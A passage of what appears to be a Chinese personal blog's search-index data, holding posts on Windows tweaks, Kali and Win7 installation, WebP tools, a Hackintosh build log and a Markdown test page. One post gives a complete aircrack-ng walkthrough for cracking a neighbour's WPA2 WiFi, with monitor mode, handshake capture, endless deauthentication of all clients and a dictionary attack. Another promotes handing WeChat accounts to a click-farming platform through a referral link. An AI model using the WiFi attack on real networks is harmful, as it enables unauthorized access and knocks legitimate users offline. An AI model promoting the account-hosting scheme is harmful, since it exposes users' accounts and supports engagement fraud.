使用方法程序启动后在窗口点击鼠标右键可以弹出右键菜单，主要功能都集中在这个菜单中。如果需要让它嵌入到任务栏显示，请勾选“显示任务栏窗口”。要显示CPU和内存利用率，请勾选“显示更多信息”。 自定义皮肤在主窗口或通知区图标右键菜单上选择“其他功能”——“更换皮肤”可以打开更换皮肤界面。点击此处可以下载更多皮肤。用户还可以根据自己的需要编辑自己的皮肤。皮肤文件放在程序所在目录的skins目录下，每个皮肤被放到单独的文件夹下，文件夹的名称就是皮肤的名称。其中background.bmp和background_l.bmp是背景图片，skin.ini是皮肤的配置文件，可以通过skin.ini指定文本颜色、字体、皮肤作者、每个项目的大小和位置等信息。详细的皮肤制作教程请点击此处。推荐使用皮肤编辑器来创建或编辑皮肤。 选项设置在右键菜单选择“选项…”可以进入选项设置。在选项设置对话框中，可以单独设置主窗口和任务栏窗口的文本颜色、字体、背景颜色、网速单位、显示的文本等。在“常规设置”选项卡中，可以设置是否在程序时自动检查更新，以及是否需要在开机是自动运行。可以设置在什么时候需要发出消息通知。从1.72版本开始，支持每个项目文本颜色单独设置。勾选“指定每个项目的颜色”后，点击“文本颜色”右边的颜色框，会弹出详细颜色设置的对话框，可以在这里单独指定每个项目的颜色。 更新日志 点击此处查看更新日志","tags":[{"name":"网速","slug":"网速","permalink":"https://www.unkaer.cf/tags/%E7%BD%91%E9%80%9F/"}]},{"title":"安装win7系统","date":"2020-01-04T09:10:45.000Z","path":"win7.html","text":"安装win7系统的详细教程。从制作启动U盘到安装后的优化设置一条龙服务。 准备工作U盘，Win7镜像，微PE工具箱 U盘推荐8G以上，读写数度越快越好可以考虑固态U盘 win7镜像 版本 说明 win7家庭版 有部分功能没有 win7专业版 满足日常使用，推荐 win7旗舰版 功能最全但硬件要求高 镜像下载网站MSDN, 我告诉你 操作系统 Windows 7 中文-简体 选择要下载的版本 英文 中文 Enterprise 企业版 Home Basic 家庭基本版 Home Premium 家庭高级版 Professional 专业 Starter 初学版 Ultimate 旗舰版 x64 64位系统 x86 32位系统 VL VL版本，可用kms激活 点击相应版本的详细信息就可以看到迅雷下载链接例如Windows 7 Professional with Service Pack 1, VL Build (x64) - DVD (Chinese-Simplified)的下载链接就是ed2k://|file|cn_windows_7_professional_with_sp1_vl_build_x64_dvd_u_677816.iso|3266004992|5A52F4CCEFA71797D58389B397038B2F|/ 复制下载链接到迅雷，开始下载镜像。 微PE工具箱访问官网微PE工具箱x64.exe下载链接 制作启动盘注意事项：关闭杀毒软件！！！ 关闭杀毒软件！！！ 关闭杀毒软件！！！ 否则启动盘很可能制作失败，启动不了。 使用步骤 安装到U盘 选则好U盘 立即安装进U盘 安装完成 拷贝win7系统到U盘里 安装镜像设置Bios因为系统默认是没有U盘启动的，需要手动打开。在开机得时候按 ESC 暂停启动，就可以看到进入Bios设置的按键提示。不同品牌系统进入Bios方法不一样。下面是一些进入Bios的按键。 品牌 按键 戴尔DELL F2 惠普HP F10 其他 Del 这里以惠普作为演示 ESC 暂停启动 F10 设置 Bios 系统设置 启动选项 传统模式 -启动 USB 启动设置 - 启动 将 U盘启动调到第一的位置 F10 保存并退出 F9 启动设备选项 选则U盘启动的引导 CGI备份还原 在Bios中选择U盘启动后 进入U盘里的PE系统格式硬盘##安装win7系统 安装win7系统镜像，注意要安装的系统的位置。 设置新系统激活系统","tags":[{"name":"win7","slug":"win7","permalink":"https://www.unkaer.cf/tags/win7/"},{"name":"微PE工具箱","slug":"微PE工具箱","permalink":"https://www.unkaer.cf/tags/%E5%BE%AEPE%E5%B7%A5%E5%85%B7%E7%AE%B1/"}]},{"title":"微信挂机网赚项目","date":"2020-01-03T10:45:23.000Z","path":"weixingj.html","text":"托管微信号自动赚钱，每天自动挣个早餐钱。 托管微信号自动赚钱：http://z.weiwee.com/Register.aspx?inviter=ababwbq1、打开小号托管平台，注册1个平台账号，邀请人 ababwbq；2、注册成功后打开平台,使用刚注册的帐号登录平台；3、登录平台后，点“我的小号”菜单，之后按以下步骤[4]操作（如果有多个微信号托管，在“我的小号”页面右上角有“托管小号”按钮，点击按步骤操作即可）；”4、扫描显示出来的“二维码”，【手机】上出现登录界面，点“登录”，然后点击“二维码”下面有“确认托管”按钮； 至此，托管就完成了，可以坐等挣钱了，每天自动挣个早餐那是妥妥的妥妥的哦！ 小号并非”小号”，该小号仅用于网赚，如：刷阅读，刷公众号关注等，绝不从事任何非法活动。 建议使用 正常使用半年绑卡的微信，否则有封号的风险。 不要使用刚注册的微信号。 因为关注公共号投票等，手机微信上就会有很多的消息，需要你自己手动去点掉，不点也没关系。 特别说明：平台使用小号完全不影响您在手机正常使用，手机上您爱干嘛干嘛，任何操作都不会影响收益，请放心~","tags":[{"name":"微信","slug":"微信","permalink":"https://www.unkaer.cf/tags/%E5%BE%AE%E4%BF%A1/"},{"name":"小号","slug":"小号","permalink":"https://www.unkaer.cf/tags/%E5%B0%8F%E5%8F%B7/"}]},{"title":"kali抓取wifi握手包","date":"2020-01-02T07:47:04.000Z","path":"wifi.html","text":"kali系统下，抓取wifi握手包，跑字典破解WiFi密码。 虚拟机安装kali系统见虚拟机安装kali系统 桥接 WiFi 网卡kali设置 网络-网卡2启用网络链接连接方式 桥接网卡选择 WiFi网卡查看无线网卡名kali2020版，应为不是root用户登录，需要切换root权限 sudo 或者 sudo su查看无线网卡名为 wlo1：方案1iwconfig方案2ifconfig安装aircrack-ng的包： apt-get install aircrack-ng排除可能会影响无线实验的因素关闭 NetworkManagerservice NetworkManager stop airmon-ng check kill 启动网卡监听monitor模式airmon-ng start ‘网卡’ airmon-ng start wlo1 附录 关闭监听airmon-ng stop wlo1mon 开启网卡ifconfig wlo1 up 关闭网卡ifconfig wlo1 down 启用 NetworkManager service NetworkManager start 搜附近wifiairodump-ng wlo1mon选择目标WiFi 记录其信息 BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID68:8A:F0:9E:11:24 -53 169 623 0 13 130 WPA2 CCMP PSK ChinaNet-FrxU 抓包则 airodump-ng ‘网口’ –bssid “BBSID” -c ‘信道’ -w ‘存放位置’ airodump-ng wlo1mon --bssid 68:8A:F0:9E:11:24 -c 13 -w /home/z7l/Documents/wifi提掉线新建终端 提掉线无限循环踢掉所有 aireplay-ng -0 0 -a 68:8A:F0:9E:11:24 wlo1mon 踢掉某一个 2秒 aireplay-ng -0 2 -a 68:8A:F0:9E:11:24 -c 04:50:DA:18:48:8A wlo1mon跑字典aircrack-ng -w ‘字典位置’ ‘握手包数据’aircrack-ng -w /home/233.txt /home/0001.cap windows上还有EWSA用显卡可以跑握手包，速度更快。","tags":[{"name":"wifi","slug":"wifi","permalink":"https://www.unkaer.cf/tags/wifi/"},{"name":"破解","slug":"破解","permalink":"https://www.unkaer.cf/tags/%E7%A0%B4%E8%A7%A3/"}]},{"title":"VirtualBox虚拟机安装kali系统","date":"2020-01-02T07:32:18.000Z","path":"VirtualBox-kali.html","text":"用VirtualBox开源虚拟机安装kali系统,并更换安装源，更新源并更新软件，修改中文。 虚拟机VirtualBox官网 下载地址官方下载地址下载相应版本 VirtualBox安装过程一路默认就即可(安装的位置要选好)安装好后 kail官网 下载地址官方下载地址附. KaliLinux64-BitTorrent2019.4迅雷下载Bt还是很快的 VirtualBox上安装kail系统新建 名称 kali-64 文件夹 安装的位置 类型 Linux 版本 Debian（64-bit） 内存大小 按自己的电脑来配，默认1024Mb就够用了。我设置的是2048Mb 虚拟硬盘 创建新虚拟硬盘 默认的硬盘类型VDI就行了 选择动态分配，节省硬盘空间 硬盘大小默认8G，建议调大一点，反正是动态分配，不会浪费空间。如果太小不够用，要加大硬盘会很麻烦。我设置的是32G设置 系统-处理器我的是四核，就分配了4个处理器（注：要开启虚拟化） 存储-控制器添加虚拟光驱，刚刚下载的kili镜像 其他默认就行，可自行修改记得点确认，否则白改了启动 启动盘如果刚刚添加了光驱，直接启动就行了。没有的话，添加下载的kali光驱就行了 安装选择图形化安装 Graphical install 选择语言 中文简体-中国 配置键盘 汉语 配置网络主机名 随便起域名 可不填 设置用户和密码反正虚拟机是自己用，密码可以简单点 磁盘分区向导-使用整个磁盘就行了（注：这是虚拟硬盘，不影响）一路默认是 写入磁盘 软件宝管理 选择没有网络，本地CD安装 （可以稍后更换国内安装源，进行更新，下面有镜像地址） 将GRUB安装到硬盘 是 选择设备 /dev… 安装完成 等待重启，进入系统登录用户名 root密码 123456开始使用 乱码中文出现了乱码 命令行 CTRL+ALT+T 启动命令行 打开安装源列表vim /etc/apt/sources.list 按 i 键，进入编辑模式 在最后输入 国内安装源更换国内安装源清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free 阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 浙大deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free 东软大学deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib 官方源deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib 按 ESC 退出编辑模式 输入 :wq 写入并保存 更新源并更新软件apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get clean 选择语言dpkg-reconfigure locales 进入图形界面，方向键 ↓找到并 空格 选中 en_US.UTF-8 UTF-8 和zh_CN.UTF-8 UTF-8注：空格是选择，tab是切换，*是选中 并将en_US.UTF-8选为默认 安装中文字体apt-get install xfonts-intl-chinese apt-get install ttf-wqy-microhei 重启，成功","tags":[{"name":"kali","slug":"kali","permalink":"https://www.unkaer.cf/tags/kali/"}]},{"title":"cwebp解码器","date":"2020-01-01T04:57:34.000Z","path":"cwebp.html","text":"cwebp解码器的使用 cwebpcwebp -将图像文件压缩为WebP文件 概要cwebp [options] input_file -o output_file.webp 描述cwebp使用WebP格式压缩图像。输入格式可以是PNG，JPEG，TIFF，WebP或原始Y’CbCr样本。 选件基本选项是： -o string指定输出WebP文件的名称。如果省略，cwebp将执行压缩，但仅报告统计信息。使用“-”作为输出名称会将输出定向到“ stdout”。 -- string明确指定输入文件。例如，如果输入文件以“-”开头，则此选项很有用。此选项必须出现last。此后任何其他选项将被忽略。 -h, -help简短的使用摘要。 -H, -longhelp所有可能选项的摘要。 -version打印版本号（作为major.minor.revision）并退出。 -lossless对图像进行编码而不会造成任何损失。对于具有完全透明区域的图像，仅当使用该-exact选项时，才会保留不可见像素值（R / G / B或Y / U / V） 。 -near_lossless int指定近乎无损的图像预处理级别。此选项调整像素值以帮助压缩，但对视觉质量的影响最小。它会自动触发无损压缩模式。范围是0（最大预处理）到100（不进行预处理，默认）。典型值在左右60。请注意，-q 100 有时可能会产生更好的结果。 -q float在0和之间指定RGB通道的压缩系数100。默认值为75。 如果是有损压缩（默认），则较小的因数会产生质量较低的较小文件。通过使用值可获得最佳质量 100。 在无损压缩（由-lossless选项指定）的情况下，较小的因数可以加快压缩速度，但会产生较大的文件。通过使用值可实现最大压缩100。 -z intlossless以0到9之间的指定级别打开压缩模式，级别0是最快的，级别9是最慢的。快速模式比慢速模式产生更大的文件大小。一个很好的默认值是-z 6。对于某些质量和方法的预定义设置，此选项实际上是快捷方式。如果随后使用选项-q 或-m，它们将使该选项的效果无效。 -alpha_q int在0和 之间指定alpha压缩的压缩系数100。使用值可实现alpha的无损压缩100，而较低的值会导致有损压缩。默认值为 100。 -preset string指定一组预定义参数以适合特定类型的源材料。可能的值有：default，photo，picture， drawing，icon，text。 由于将-preset覆盖其他参数的值（-q 一个参数除外），因此该选项最好应按参数的顺序首先出现。 -m int指定要使用的压缩方法。此参数控制编码速度与压缩文件大小和质量之间的权衡。可能的值从0到6。默认值为4。当使用更高的值时，编码器将花费更多的时间检查其他编码可能性，并决定质量增益。较低的值可能导致处理时间更快，但文件大小较大且压缩质量较低。 -resize width height将源调整为大小为widthx 的矩形height。如果width或height参数中的任何一个（但不是全部）均为0，则将计算该值，并保留宽高比。 -crop x_position y_position width height将源裁剪为在坐标（x_position，y_position）处具有左上角且大小为widthx 的矩形height。此裁剪区域必须完全包含在源矩形内。 -mt如果可能，请使用多线程进行编码。 -low_memory通过节省四倍于压缩大小（通常）来减少有损编码的内存使用。这将使编码变慢，并且输出的大小和失真会稍有不同。该标志仅对方法3及更高版本有效，并且默认情况下处于禁用状态。请注意，保留此标志将对比特流产生一些副作用：它将强制执行某些比特流功能，例如分区数（强制为1）。请注意，cwebp使用此选项时，将打印有关位流大小的更详细的报告。 有损期权这些选项仅在进行有损编码（默认设置，带有或不带有alpha）时才有效。 -size int指定目标大小（以字节为单位）以尝试达到压缩输出。压缩程序将进行几次局部编码，以尽可能接近此目标。如果同时使用-size和， -psnr则以-size价值为准。 -psnr float指定目标PSNR（以dB为单位）以尝试达到压缩输出。压缩程序将进行几次局部编码，以尽可能接近此目标。如果同时使用-size和，-psnr则以 -size价值为准。 -pass int设置选项-size或使用的二分法期间要使用的最大通过次数 -psnr。最大值为10，默认值为1。如果使用了选项 -size或-psnr，但未-pass指定，则将使用默认值“ 6”次传递。 -af打开自动过滤器。该算法将花费额外的时间来优化滤波强度，以达到均衡的质量。 -jpeg_like更改内部参数映射以更好地匹配JPEG压缩的预期大小。通常，此标志将产生一个输出文件，其大小与其JPEG等效（对于相同的-q设置）类似，但视觉失真较小。高级选项： -f int在0（不过滤）和100（最大过滤）之间指定解块过滤器的强度。值0将关闭所有过滤。较高的值将增加在解码图片后应用的滤波过程的强度。值越高，图片越平滑。典型值通常的范围内20来50。 -sharpness int指定过滤的清晰度（如果使用）。范围是0（最锐利）至7（最不锐利）。默认值为0。 -strong使用强过滤（如果由于该-f 选项而使用了过滤）。默认情况下，强过滤处于启用状态。 -nostrong禁用强过滤（如果由于该-f 选项而使用了过滤），而改用简单过滤。 -sharp_yuv如果需要，请使用更准确，更清晰的RGB-&gt; YUV转换。请注意，此过程比默认的“快速” RGB-&gt; YUV转换要慢。 -sns int指定空间噪声整形的幅度。空间噪声整形（或简称为sns）是指用于确定图片的哪个区域应使用相对较少的位以及在何处更好地传输这些位的内置算法的常规集合。可能的范围是从 0（算法关闭）到100（最大效果）。默认值为 50。 -segments int更改在sns算法分段期间要使用的分区数。细分范围应在1到之间4。默认值为4。除非-low_memory使用此选项，否则对方法3及更高版本无效。 -partition_limit int通过限制某些宏块使用的位数来降低质量。范围是0（无降级，默认）到100（完全降级）。有用的值通常在左右30- 70对于中等大小的图像。在VP8格式中，所谓的控制分区的限制为512k，用于存储以下信息：宏块是否被跳过，宏块属于哪个段，编码为内部4x4还是内部16x16模式，以及最后，将预测模式用于每个子块。对于非常大的图像，每个16x16宏块只有512k的空间。每个宏块的绝对最小值为4位。跳过，分段和模式信息几乎会用完所有这4位（尽管情况不太可能），这对于非常大的图像来说是个问题。的 partition_limitfactor控制最昂贵的模式（内部4x4）的使用频率。如果达到512k限制并显示以下消息，这将很有用：错误代码：6（PARTITION0_OVERFLOW：分区＃0太大，无法容纳512k）。如果使用 -partition_limit不足以满足512k的限制，则应使用较少的段，以便为每个宏块节省更多的报头位。参见-segments选项。 记录选项这些选项控制输出级别： -v打印更多信息（特别是编码时间）。 -print_psnr计算并报告平均PSNR（峰值信噪比）。 -print_ssim计算并报告平均SSIM（结构相似性指标，请参见 http://en.wikipedia.org/wiki/SSIM了解更多详细信息）。 -print_lsim计算并报告局部相似性度量（并置像素邻居中的最低误差之和）。 -progress报告编码进度（百分比）。 -quiet不要打印任何东西。 -short仅打印简短信息（输出文件大小和PSNR）以进行测试。 -map int输出编码信息的其他ASCII映射。可能的地图值范围是1到6。这仅是为了帮助调试。附加选项更高级的选项是： -s width height指定输入文件实际上是按照ITU-R BT.601建议以4：2：0线性格式包含的原始Y’CbCr样本。亮度平面的大小为widthx height。 -pre int指定一些预处理步骤。使用值2将在RGBA-&gt; YUVA转换（仅有损压缩）期间触发与质量有关的伪随机抖动。 -alpha_filter string指定Alpha平面的预测过滤方法。其中之一 none，fast或者best，在日益复杂和缓慢秩序。默认值为fast。在内部，使用四个可能的预测（无，水平，垂直，渐变）执行alpha过滤。该best 模式将依次尝试每种模式，然后选择尺寸较小的模式。该fast模式将尝试形成先验猜测而不测试所有模式。 -alpha_method int指定用于Alpha压缩的算法：0或1。算法 0表示无压缩，1使用WebP无损格式进行压缩。默认值为1。 -exact将RGB值保留在透明区域中。默认为关闭，以帮助压缩。 -blend_alpha int此选项使用十六进制指定为0xrrggbb的背景色将alpha通道（如果存在）与源混合。之后，将Alpha通道重置为不透明值255。 -noalpha使用此选项将丢弃Alpha通道。 -hint string指定有关输入图像类型的提示。可能的值是：photo， picture或graph。 -metadata string逗号分隔的元数据列表，如果存在，则从输入复制到输出。有效值：all，none，exif，icc，xmp。默认值为 none。 请注意，每种输入格式可能不支持所有组合。 -noasm禁用所有装配优化。","tags":[{"name":"webp","slug":"webp","permalink":"https://www.unkaer.cf/tags/webp/"}]},{"title":"libwebp工具","date":"2020-01-01T04:56:52.000Z","path":"libwebp.html","text":"libwebp 工具图像爱好者应该使用许多支持WebP的软件产品之一 下载地址官方地址下载列表 针对Linux，Windows和Mac OS X的预编译WebP实用程序和库。它们包括：libwebp库，可用于向程序添加WebP编码或解码。 cwebp -WebP编码器工具 dwebp -WebP解码器工具 vwebp -WebP文件查看器 webpmux -WebP混合工具 gif2webp-用于将GIF图像转换为WebP的工具 使用cwebp将图像转换为WebP的格式cwebp在命令行上使用可以将PNG或JPEG图像文件转换为WebP格式。您可以使用以下命令将PNG图像文件转换为质量范围为80的WebP图像： cwebp -q 80 image.png -o image.webp 使用dwebp从WebP的格式转换图像dwebp在命令行上使用可以将WebP图像文件转换为PNG或PPM格式。您可以image.webp使用以下命令将WebP图像文件转换为PNG图像： dwebp image.webp -o image.png","tags":[{"name":"libwebp","slug":"libwebp","permalink":"https://www.unkaer.cf/tags/libwebp/"},{"name":"webp","slug":"webp","permalink":"https://www.unkaer.cf/tags/webp/"},{"name":"工具","slug":"工具","permalink":"https://www.unkaer.cf/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"webp优化图像","date":"2020-01-01T04:56:10.000Z","path":"webp.html","text":"为了加快网页访问速度。对图片进行优化，减少图片大小，以减少网页加载时间，达到加快访问网页的目的。 WebPWebP是一种同时提供了有损压缩与无损压缩（可逆压缩）的图片文件格式 WebP最初在2010年发布，目标是减少文件大小，但达到和JPEG格式相同的图片质量，希望能够减少图片档在网络上的发送时间。转码工具有在线网站可以图片格式转换，也可以用工具转换。 推荐工具libwebp 使用说明见libwebp工具","tags":[{"name":"webp","slug":"webp","permalink":"https://www.unkaer.cf/tags/webp/"},{"name":"图像","slug":"图像","permalink":"https://www.unkaer.cf/tags/%E5%9B%BE%E5%83%8F/"}]},{"title":"win10时间精确到秒","date":"2019-12-31T12:33:02.000Z","path":"win10-time.html","text":"Win10右下角的时间显示到秒 1.打开注册表同时按下Win键+R键，在运行命令窗口输入 regedit回车 2.新建【DWORD（32位）值】在注册表中定位到 计算机\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced在空白处右击，选择新建【DWORD（32位）值】 3.修改值将新建值的名称改为 ShowSecondsInSystemClock双击编辑数值数据，将其改为 1，点击确定。 4.重启资源管理器①打开任务管理器 (快捷键 CTRL+SHIFT+ESC)鼠标右键任务栏→任务管理器②选择资源管理器→重新启动桌面右下角的时间就显示到秒了","tags":[{"name":"win10","slug":"win10","permalink":"https://www.unkaer.cf/tags/win10/"},{"name":"时间","slug":"时间","permalink":"https://www.unkaer.cf/tags/%E6%97%B6%E9%97%B4/"}]},{"title":"取消win10锁屏页面上关机按钮","date":"2019-12-31T12:29:41.000Z","path":"win10spgj.html","text":"去掉Win10登录界面的电源按钮，让锁屏更安全 1.打开注册表同时按下Win键+R键，在运行命令窗口输入 regedit回车 2.修改【DWORD（32位）值】在注册表中定位到 计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System 找到 shutdownwithoutlogon双击打开，修改为 0 3.锁屏尝试快捷键 win+L 锁屏观察右下角的电源按钮不见了。 大功告成","tags":[{"name":"win10","slug":"win10","permalink":"https://www.unkaer.cf/tags/win10/"},{"name":"锁屏","slug":"锁屏","permalink":"https://www.unkaer.cf/tags/%E9%94%81%E5%B1%8F/"}]},{"title":"光影精灵4-黑苹果14安装","date":"2019-12-31T10:04:05.000Z","path":"mac14.html","text":"光影精灵4，黑苹果14安装记录 电脑配置 CPU i5-8300h 核显 HD630 内存 2*8GB 2667MHz 独显 GTX1050 下载镜像来自黑果小兵官网的macOS Mojave 10.14 18A391 正式版 with Clover 4674原版镜像本站使用的镜像是 macOS Mojave 10.14.6(18G87) Installer for Intel and AMD with Clover 5050 and WEPE.dmg本站提供网盘下载配合IDM、aria2等工具可全速下载 =======本站提供[网盘下载](https://bitter-bush-d5ab.ababwbq.workers.dev/?file=/ISO/Mac/macOS Mojave 10.14.6(18G87)%20Installer%20for%20Intel%20and%20AMD%20with%20Clover%205050%20and%20WEPE.dmg)配合IDM、aria2等工具可全速下载 c4fa74454180b96446276b709706c9bc2817ad2a当时使用的是14版本，现在已经更到15版了。15版没有安装成功，短时间内不想折腾了。15版安装见光影精灵4-黑苹果15安装记录 安装Mac1.制作U盘启动需要软件：balenaEtcher官网地址：https://www.balena.io/etcher/使用方法：选择镜像→选择U盘→点击Flash! 然后漫长的等待烧录完成 2.安装Mac①为Mac分区分一块硬盘来安装Mac。右键我的电脑—&gt;管理—&gt;磁盘管理—&gt;右键要压缩的磁盘—&gt;压缩盘—&gt;按照提示压缩一块合适你使用的大小。会有一个漫长的等待过程。 ②建立EFI分区镜像自带PE，U盘启动的第一个EFI进入PE系统，用DiskGenius在刚刚建立的空白分区上建立EFI分区，然后格式化剩余空间作为Mac安装的空间。不建立EFI，后面安装Mac时可能抹除失败。 ③安装MacU盘启动的第二个EFI进入Mac安装界面，先用磁盘工具，将用来安装安装Mac的分区盘抹除，格式为MacOS。然后一路安装，会重启几次。 附录 会遇到一些问题,安装时弹出 Mac安装系统提示应用程序副本已损坏,不能用来安装macOS 问题原因：证书到期导致的问题，改到这个日期前就行了。解决方案：重启 -&gt; 打开左上角实用工具 -&gt; 找到终端打开输入 （先不要安装） date 110713212015.3011 月、07日、13时、21分、2015年、30秒 驱动设置驱动的安装方法：（驱动EFI/clover/kext/Backup下都有备份）1.（推荐）驱动xxx.kext拷贝到EFI/clover/kext下，然后重启(建议一次安装一个，好排错，虽然有点慢)2.使用软件安装。。。。（不推荐） 1.网卡安装因为默认的就能用，so。。。 2.显卡下载clover mac中文版，操作方便些。pc6上有下载显卡没有正确驱动时，在关于本机中图形卡显示7MB，浏览器上方标签显示异常。修改platform ID打开clove，挂载EFI分区，先复制备份EFI/Clover下config.plist，才能有后悔的机会。用clover打开显卡设置中找到 ig-platform-id，选择相应的显卡，我的630就选0x3E920000，保存，重启即可。关于本机中图形卡显示1536MB 3.声卡驱动声卡有两种方式： 两种驱动方式只能选择其一 方式一：使用万能声卡驱动 VoodooHDA.kext 版本 说明 2.8.9 驱动完美，输出输入都识别正确(但最大音量比win10下小,且录音时有很大的噪音) 2.9.1 安装后不能开机，原因未知 2.9.2 安装后只能读取到输出HDMI，声卡不能用 方式二：使用仿冒声卡 AppleALC.kext驱动原生声卡。这种方式需要在配置文件的audio中根据自己声卡型号注入声卡id。方法见 黑果小兵-使用AppleALC声卡仿冒驱动AppleHDA的正确姿势， 太麻烦了，所以弃用，有时间可以尝试 高速下载 AppleALC-1.4.5AppleALC GitHub项目地址可以自行编译。本机使用声卡 ALC295 项目已经支持 将仿冒声卡 AppleALC.kext 放到 EFI/clover/kext 下 修改 EFI/Clover下config.plist 设备设置 -&gt; Audio -&gt; 注入 ID 官网注入ID的列表见 wiki-Supported codecs ALC295Realtek ALC295 layout 1, 3, 13, 14, 15, 21, 28, 77 分别尝试后得出以下结果 Audio-ID 内置喇叭 耳机 内置麦克风 录制噪音 1 ❌ ⭕️ ⭕️ 无 3 ❌ ⭕️ ⭕️ 无 13 ⭕️ ⭕️ ⭕️ 无 15 ❌ ⭕️ ⭕️ 无 21 ⭕️ ⭕️ ⭕️ 微小 28 ⭕️ ⭕️ ⭕️ 无 77 ⭕️ ⭕️ ⭕️ 无 所以 ID 13、 21、 28、 77 均可使用，没有进一步进行比较。声音均比万能驱动的大，耳机与喇叭自动切换。 4.触控板键盘、触摸板驱动安装触摸板驱动前需要明确你的触摸板型号是I2C还是PS2，可在Windows设备管理器查询。我的是PS2！！！同理两个驱动只能选择一个使用，不能同时放到驱动目录方式一：使用VoodooPS2Controller.kext驱动在我的电脑上这个驱动只支持点击并不支持多指手势，而且一点触控板，鼠标就乱飞，左键不能用（触控板多点几次以后，乱飞几次后，鼠标可恢复正常）。方式二：安装ApplePS2SmartTouchPad.kext驱动触控能用，但触控板设置用不了。在安装电量显示后正常使用。 5.电量显示1将驱动ACPIBatteryManager.kext放到EFI/clover/kexts目录下，2然后打上DSDT补丁，但实际操作中我没有这一步，重启后就直接显示正常了，如果有问题，去找相应的帖子。 6.亮度调节暂时没有 (Wi-Fi，蓝牙不能用) 变白苹果，登陆icloud 先备份 config.plist 修改 config.plist文件(使用Clover Configurator Mac版打开) 机型设置选择一个配置相近，或者最新的型号 生成新的序列号 关于本机-服务支持，官网输入序列号，查询序列号是否有效(如果无效重新生成即可) 变量设置 - 生成 系统参数 - 复制机型设置中的SmuuID到系统参数中 保存，重启。 登录icloud成功 日常使用设置让Mac用起来更习惯一点 鼠标滚动不习惯Mac的鼠标滚轮，和win上刚好相反鼠标设置取消 滚动方向：自然 就行了 输入法切换Mac默认输入法切换的快捷键没开键盘-快捷键-输入法 中打开，还可以自定义快捷键 时间显示在菜单栏显示时间和日期，方便看时间日期与时间-时钟 电量百分比显示在菜单栏显示电池状态节能 实时网速想看实时网速，win上面习惯了推荐软件 Bandwidth Mac应用商店里面就有打开软件的偏好设置，将实时流量显示在菜单栏上 问题待机(睡眠)后黑屏，无法使用（重启）inter wifi不能用，只有买外置wifi没有蓝牙","tags":[{"name":"mac","slug":"mac","permalink":"https://www.unkaer.cf/tags/mac/"}]},{"title":"Markdown格式测试文章","date":"2019-12-31T02:47:42.000Z","path":"test.html","text":"md格式编写文章的示例 欢迎使用 Markdown在线编辑器 MdEditorMarkdown是一种轻量级的「标记语言」 Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。它允许人们使用易读易写的纯文本格式编写文档，然后转换成格式丰富的HTML页面，Markdown文件的后缀名便是“.md” MdEditor是一个在线编辑Markdown文档的编辑器MdEditor扩展了Markdown的功能（如表格、脚注、内嵌HTML等等），以使让Markdown转换成更多的格式，和更丰富的展示效果，这些功能原初的Markdown尚不具备。 Markdown增强版中比较有名的有Markdown Extra、MultiMarkdown、 Maruku等。这些衍生版本要么基于工具，如Pandoc，Pandao；要么基于网站，如GitHub和Wikipedia，在语法上基本兼容，但在一些语法和渲染效果上有改动。 MdEditor源于Pandao的JavaScript开源项目，开源地址Editor.md，并在MIT开源协议的许可范围内进行了优化，以适应广大用户群体的需求。向优秀的markdown开源编辑器原作者Pandao致敬。 MdEditor的功能列表演示标题H1标题H2标题H3标题H4标题H5标题H5字符效果和横线等 删除线 删除线（开启识别HTML标签时） 斜体字 斜体字 粗体 粗体 粗斜体 粗斜体 上标：X2，下标：O2 缩写(同HTML的abbr标签) 即更长的单词或短语的缩写形式，前提是开启识别HTML标签时，已默认开启 The HTML specification is maintained by the W3C. 引用 Blockquotes 引用文本 Blockquotes 引用的行内混合 Blockquotes 引用：如果想要插入空白换行即&lt;br /&gt;标签，在插入处先键入两个以上的空格然后回车即可，普通链接。 锚点与链接 Links普通链接普通链接带标题直接链接：https://www.mdeditor.com[锚点链接][anchor-id][anchor-id]: https://www.mdeditor.com/mailto:test.test@gmail.comGFM a-tail link @pandao邮箱地址自动链接 test.test@gmail.com www@vip.qq.com @pandao 多语言代码高亮 Codes行内代码 Inline code执行命令：npm install marked 缩进风格即缩进四个空格，也做为实现类似 &lt;pre&gt; 预格式化文本 ( Preformatted Text ) 的功能。 &lt;?php echo &quot;Hello world!&quot;; ?&gt;预格式化文本： | First Header | Second Header | | ------------- | ------------- | | Content Cell | Content Cell | | Content Cell | Content Cell |JS代码function test() { console.log(&quot;Hello world!&quot;); } HTML 代码 HTML codes&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;mate charest=&quot;utf-8&quot; /&gt; &lt;meta name=&quot;keywords&quot; content=&quot;Editor.md, Markdown, Editor&quot; /&gt; &lt;title&gt;Hello world!&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body{font-size:14px;color:#444;font-family: &quot;Microsoft Yahei&quot;, Tahoma, &quot;Hiragino Sans GB&quot;, Arial;background:#fff;} ul{list-style: none;} img{border:none;vertical-align: middle;} &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 class=&quot;text-xxl&quot;&gt;Hello world!&lt;/h1&gt; &lt;p class=&quot;text-green&quot;&gt;Plain text&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; 图片 Images图片加链接 (Image + Link)： Follow your heart. 列表 Lists无序列表（减号）Unordered Lists (-) 列表一 列表二 列表三 无序列表（星号）Unordered Lists (*) 列表一 列表二 列表三 无序列表（加号和嵌套）Unordered Lists (+) 列表一 列表二 